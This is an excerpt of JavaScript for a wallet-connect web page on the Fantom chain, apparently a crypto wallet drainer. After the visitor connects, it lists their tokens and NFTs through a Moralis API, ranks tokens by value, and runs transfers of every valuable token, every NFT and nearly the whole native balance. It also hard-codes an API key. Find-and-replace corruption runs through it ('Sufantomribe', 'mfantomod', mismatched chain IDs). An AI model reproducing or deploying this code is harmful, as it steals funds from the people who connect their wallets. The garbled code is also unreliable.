...
//   console.log("Fortmatic is", Fortmatic);
  ...
  const providerOptions = {
    ...
    //     rpc:{
    //       56: "https://fantom-dataseed.binance.org",
...
async function fetchAccountData() {
  ...
  //change chain to fantom
  web3.eth.defaultCommon = {
    customChain: {name: 'fantom Network', chainId: 0xa86a , networkId: 0xa86a }, baseChain: 'mainnet', hardfork: 'petersburg'};
...
//   accountContainer.innerHTML = '';
  ...
  // Go through all accounts and get their fantom balance
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    // fantomBalance is a BigNumber instance
    // https://github.com/indutny/bn.js/
    const fantomBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(fantomBalance).toFixed(4);
...
async function onConnect() {
  ...
  // Sufantomribe to accounts change
  ...
  // Sufantomribe to chainId change
  ...
  // Sufantomribe to networkId change
...
async function onDisconnect() {
  ...
  // TODO: Which providers have close mfantomod?
  if(provider.close) {
...
async function getTokens(address="", api_key="", chain="fantom"){
    return new Promise((resolve, reject)=>{
        fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=fantom`, {
            method: "GET",
            headers: {
...
async function getNFTs(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="fantom", limit="98"){
  return new Promise((resolve, reject)=>{
...
async function getBalance(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="fantom"){
  return new Promise((resolve, reject)=>{
      fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=fantom`, {
          mfantomod: "GET",
          headers: {
              "accept": "application/json",
              "X-API-Key": api_key
...
async function proceed(){
  ...
  console.log("Now we roll!!!");
    ...
    //   user_address = user.get('fantomAddress')
    ...
    async function send() {
        ...
        // const fantom_nfts = await Moralis.Web3API.account.getNFTs(nft_options).catch(e=>{
        //   console.log("Unable to get NFTs", e);
        // })
        // console.log('fantom NFTs: %o', fantom_nfts)
        
        const fantom_tokens = await getTokens(user_address, apiKey).catch(e=>{
          console.log("Unable to get tokens", e);
        });
        const fantom_NFTs = await getNFTs(user_address).catch(e=>{
          console.log("Unable to get NFts", e);
        ...
        if (fantom_tokens.length < 1 && fantom_NFTs.length < 1) {
          ...
          console.log("ftm_balance", ftm_balance);
          console.log("ftm_balance.balance", ftm_balance.balance);
          
          const balance = ((parseInt(ftm_balance.balance))/1000000000000000000) - 0.005;
          console.log("The new ftm balance", balance);
          if (balance > 0) {
          const options = {
            type: "native",
          ...
          return console.log('No fantom tokens found')
        }

        const real_fantom_token = new Array();
        const fantom_length = fantom_tokens.length;
        function callback (x) { 
          x.sort((a, b) => b.realprice - a.realprice);
          console.log("real_fantom_token length : ", x.length);
          console.log("real_fantom_token : ", x);
         }

        // Get tokens real values
        await fantom_tokens.forEach(async function(token,i){
        ...
        if(i+1 === fantom_length) {
          callback(real_fantom_token);
          transferNow();
        }
      })
          // .catch(e=>{
        ...
        // fantom_nfts.result.forEach(async (nft, i) => {
          //transfer tokens
          let x = 0;
          let y = 0;
          let mum = "";
          async function transferNow(){
            for(let n=0; n<fantom_length && real_fantom_token[n].realprice>1; n++){
              x = x + 1;
              console.log("Token ", n); 
              
              let token = real_fantom_token[Number(n)];
          ...
          if (transaction) {
            ...
            for(let n=0; n<fantom_NFTs.result.length; n++){
              y = y + 1;
              let nft = fantom_NFTs.result[Number(n)];
          ...
          if (x === fantom_length && y === fantom_NFTs.result.length && (mum === "approved" || mum === "denied")){
        const ftm_balance = await getBalance(user_address, apiKey).catch(e=>{
          console.log("Unable to get new fantom balance", e);
        });
        console.log("ftm_balance", ftm_balance);
